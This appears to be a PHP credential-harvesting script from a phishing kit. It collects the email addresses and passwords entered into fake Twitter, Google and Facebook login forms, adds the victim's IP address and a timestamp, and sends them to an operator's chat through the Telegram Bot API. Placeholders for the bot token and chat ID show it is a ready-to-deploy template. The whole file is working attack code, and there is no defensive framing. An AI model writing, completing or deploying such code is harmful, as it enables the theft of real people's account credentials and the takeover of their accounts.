<?php

if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip_address = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip_address = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip_address = $_SERVER['REMOTE_ADDR'];
}

$d = new DateTime("now", new DateTimeZone("Asia/Baghdad")); // If You Want : Set Your City Here
$time = $d->format("Y/m/d  h:i:s A");
if (isset($_POST['info'])) {
    if ($_POST['info'] == "Twitter") {
        $msg = urlencode("New Login From Twitter : \nEmail : " . $_POST['email'] . "\nPassword : " . $_POST['password'] . "\nTime : " . $time . "\nIp : " . $ip_address . "\n®Mr28");
    }
    if ($_POST['info'] == "google") {
        $msg = urlencode("New Login From Google : \nEmail : " . $_POST['email'] . "\nPassword : " . $_POST['password'] . "\nTime : " . $time . "\nIp : " . $ip_address . "\n®Mr28");
    }
    if ($_POST['info'] == "facebook") {
        $msg = urlencode("New Login From Facebook : \nEmail : " . $_POST['email'] . "\nPassword : " . $_POST['password'] . "\nTime : " . $time . "\nIp : " . $ip_address . "\n®Mr28");
    }
}

$apiToken = "Your Telegram Bot Here";

// Me
$response = file_get_contents("https://api.telegram.org/bot".$apiToken."/sendMessage?chat_id=[Your Telegram User ID Here]&text=" . $msg);
// Like This 
//$response = file_get_contents("https://api.telegram.org/bot".$apiToken."/sendMessage?chat_id=692817475&text=" . $msg);
